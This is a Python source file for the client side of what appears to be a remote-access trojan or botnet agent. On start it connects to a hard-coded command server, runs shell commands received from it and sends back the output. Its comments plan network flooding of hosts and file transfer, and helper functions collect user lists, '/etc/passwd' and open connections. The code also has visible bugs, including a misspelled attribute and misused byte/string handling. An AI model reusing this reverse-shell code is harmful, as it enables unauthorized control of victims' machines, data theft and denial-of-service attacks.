import socket
import subprocess
import os
import sys
import random
from scapy.all import *
from psutil import *
#from .ICMPFlood import ICMPFlood

#   Client need to implement following methods:
#    [*] CMD execution and sending its result to the server.
#    [*] Network flooding of a given host.
#    [*] Downloading files from the server.
#    [*] Uploading files to the server.

s = socket.socket()
host = '172.20.10.3'
port = 12345
s.connect((host, port))



def cmd_commands(data):
    while True:
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte,"utf-8")
            currentWD = os.getcwd() + "> "
            s.send(str.encode(output_str + currentWD))

            print(output_str)

def handler():
    data = s.recv(1024)
    if str.encode(data).lower().startswith("CMD"):
        cmd_commands(data[4:])
    elif str.encode(data).lower().startswith("Flood"):
        #network_flood()
        pass
    else:
        print("Downloading or uploading")

# Send to client system up time
def up_time(conn):
    if sys.platfrom.startswith("win"):
        conn.send(str.encode("systeminfo | find  \"System Boot Time:\" "))
    else:
        conn.send(str.encode("uptime -s"))

# Send to
def open_connections(conn):
    conn.send(str.encode("netstat"))

def network_flood():
    #attack = ICMPFlood()
    pass
def open_windows(conn):
    for proc in psutil.process_iter():
        print(proc)

def list_users_groups(conn):
    if sys.platform.lower().startswith("win"):      #windows
        conn.send("net user")
    elif sys.platform.lower().startswith("dar"):        #macOS
        conn.send("dscl . list /Users | grep -v '_'")
    else:
        conn.send("cat /etc/passwd")

handler()